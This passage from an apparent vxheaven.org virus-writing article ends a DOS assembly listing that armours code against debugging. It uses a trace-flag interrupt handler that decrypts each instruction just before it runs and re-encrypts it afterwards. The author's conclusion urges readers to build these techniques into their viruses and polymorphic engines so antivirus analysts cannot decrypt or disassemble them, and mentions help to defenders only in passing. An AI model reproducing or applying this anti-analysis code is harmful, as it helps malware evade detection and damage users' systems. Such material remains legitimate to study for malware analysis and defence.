+<span style="color: black; font-style: italic;">;** run). Thats why each word is XOR'd with $ (it's position). &nbsp; &nbsp; &nbsp; ** </span><br/>
+<span style="color: black; font-style: italic;">;**********************************************************************</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; 01f0e <span style="color: #00007f; font-weight: bold;">XOR</span> <span style="color: #0000ff; font-weight: bold;">$</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;">;PUSH CS / POP DS</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; 009b4 <span style="color: #00007f; font-weight: bold;">XOR</span> <span style="color: #0000ff; font-weight: bold;">$</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;">;MOV AH,9h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; 0ba90 <span style="color: #00007f; font-weight: bold;">XOR</span> <span style="color: #0000ff; font-weight: bold;">$</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;">;NOP / MOV DX,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; offset msg&nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;offset msg</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; 021cd <span style="color: #00007f; font-weight: bold;">XOR</span> <span style="color: #0000ff; font-weight: bold;">$</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;">;INT 21h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">0e589</span> <span style="color: #00007f; font-weight: bold;">XOR</span> <span style="color: #0000ff; font-weight: bold;">$</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;">;MOV BP,SP</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">06680</span> <span style="color: #00007f; font-weight: bold;">XOR</span> <span style="color: #0000ff; font-weight: bold;">$</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;">;AND B[BP+,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; 0feff &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;FF],FE (turn off TRACE flag). </span><br/>
+<br/>
+last_enc&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">equ</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">$</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; 0bb9d <span style="color: #00007f; font-weight: bold;">XOR</span> <span style="color: #0000ff; font-weight: bold;">$</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;">;POPF / MOV BX,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; last_enc&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;LAST_ENC</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span>W<span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">bx</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;">;re-encrypt last instruction.. </span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span>W<span style="color: black;">&#91;</span><span style="color: #ff0000;">4</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">di</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span>W<span style="color: black;">&#91;</span><span style="color: #ff0000;">6</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">si</span>&nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;restore int 1 vector </span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span>4c<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21</span><br/>
+<br/>
+<span style="color: black; font-style: italic;">;^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ </span><br/>
+<span style="color: black; font-style: italic;">;THINGS TO NOTE FROM THE ABOVE: Firstly, in the instructions </span><br/>
+<span style="color: black; font-style: italic;">; &nbsp;NOP</span><br/>
+<span style="color: black; font-style: italic;">; &nbsp;MOV &nbsp;DX,OFFSET MSG</span><br/>
+<span style="color: black; font-style: italic;">;the MOV DX opcode is on an odd boundary, and hence, the decryptor will </span><br/>
+<span style="color: black; font-style: italic;">;not decrypt it. Secondly the 'DW OFFSET MSG' in MOV &nbsp;DX,OFFSET MSG </span><br/>
+<span style="color: black; font-style: italic;">;is not encrypted, because it it is data from another instruction, and </span><br/>
+<span style="color: black; font-style: italic;">;therefore it will never be executed, and passed to the INT 1 handler. </span><br/>
+<span style="color: black; font-style: italic;">;The same goes for the +FF(-1),FE in the AND B[BP-1],FE.</span><br/>
+<br/>
+<span style="color: black; font-style: italic;">;**********************************************************************</span><br/>
+<span style="color: black; font-style: italic;">;** The following procedure, is the work horse of this code. The CPU ** </span><br/>
+<span style="color: black; font-style: italic;">;** will call this INT 1 handler before each opcode as long as the &nbsp; ** </span><br/>
+<span style="color: black; font-style: italic;">;** TRACE flag is set. Unlike most INT 1 handlers that you'll see in ** </span><br/>
+<span style="color: black; font-style: italic;">;** virii, this contains no defensive traps. This is because we are &nbsp;** </span><br/>
+<span style="color: black; font-style: italic;">;** tracing our own code, and not unknown (possibly hostile) code. &nbsp; ** </span><br/>
+<span style="color: black; font-style: italic;">;** It retrieves the calling IP from the stack, and if it is odd, &nbsp; &nbsp;** </span><br/>
+<span style="color: black; font-style: italic;">;** exits. If even, it will re-encrypt the previous instruction, and ** </span><br/>
+<span style="color: black; font-style: italic;">;** decrypt the current one. It saves the calling IP, so that it can ** </span><br/>
+<span style="color: black; font-style: italic;">;** re-encrypt it when it is called for the next instruction. &nbsp; &nbsp; &nbsp; &nbsp;** </span><br/>
+<span style="color: black; font-style: italic;">;**********************************************************************</span><br/>
+<br/>
+tracer<span style="color: #339933;">:</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bp</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;save BP</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">sp</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;BP=SP for reference point of stack. </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;save SI</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">,</span>W<span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span><span style="color: #ff0000;">2</span><span style="color: black;">&#93;</span>&nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;BP = calling IP (position of </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;encrypted instruction). </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;check if on an odd boundry.. </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; is_odd&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;it is so leave.</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span>last&nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;else get the position of the last </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;decrypted instruction to reincrypt. </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span>last<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">bp</span>&nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;save current position for next time. </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span>W<span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">si</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">si</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;">;re-encrypt last (XOR it with its IP) </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span>W<span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">bp</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;">;decrypt current (XOR it with its IP) </span><br/>
+is_odd<span style="color: #339933;">:</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;restore SI</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bp</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;restore BP</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">iret</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;adeos!</span><br/>
+<br/>
+last&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;last IP for re-encrpytion.. </span><br/>
+msg &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">'Yeah!!$'</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;EVERYBODY SAY YEAH!!!! </span><br/>
+&nbsp;</div>
+<h2><a name="c4"></a>Conclusion</h2>
+<p><em>Taught when we are young to hate one another</em></p>
+<p>I <strong>strongly</strong> urge you to employ the above techniques in your virii and/or poly engine. If your virus refuses to infect bait files, is <strong>very</strong> heavilly armoured, so the can not decrypt it, and dissasemble it, and mutates so slowly, and on such obscure conditions, <strong>how are they going to it</strong>? Devising an algorith for such a virus would be <em>very</em> difficult.</p>
+<h2><a name="c5"></a>Bye-bye</h2>
+<p>Thank you reading this article. I hope it's been as interesting to read as it has been to write!! Hopefully, we will be seeing the AV having to work <em>a lot</em> harder for their money too ;). Alternitively, this could be some help to the AV community, so they can see what lies ahead.</p>
+<p>If you have any questions, comments, critisms, or new ideas, you can get in touch with me on IRC, channel #VIRUS, Nickname 'Sepultura' or 'Sep'. I would really appreciate <em>any</em> comments (excpet 'Get Bent!!').</p>
+[<a style="" href="/lib/?lang=EN&amp;index=DO#vse00">Back to index</a>] [<a href="/lib/vse00.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
+<script type="text/rocketscript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
+<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
+<div style="margin-top: 2px; float: left;" class="adsapeu">
+<script type="text/rocketscript">
+<!--
+var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
+//-->
+</script>
+</div>
+<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
+<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vse00">de</a><a href="/lib/index.php?lang=en&amp;id=vse00">en</a><a href="/lib/index.php?lang=es&amp;id=vse00">es</a><a href="/lib/index.php?lang=it&amp;id=vse00">it</a><a href="/lib/index.php?lang=fr&amp;id=vse00">fr</a><a href="/lib/index.php?lang=pl&amp;id=vse00">pl</a><a href="/lib/index.php?lang=ru&amp;id=vse00">ru</a><a href="/lib/index.php?lang=ua&amp;id=vse00">ua</a></div>
+</body>
+</html>
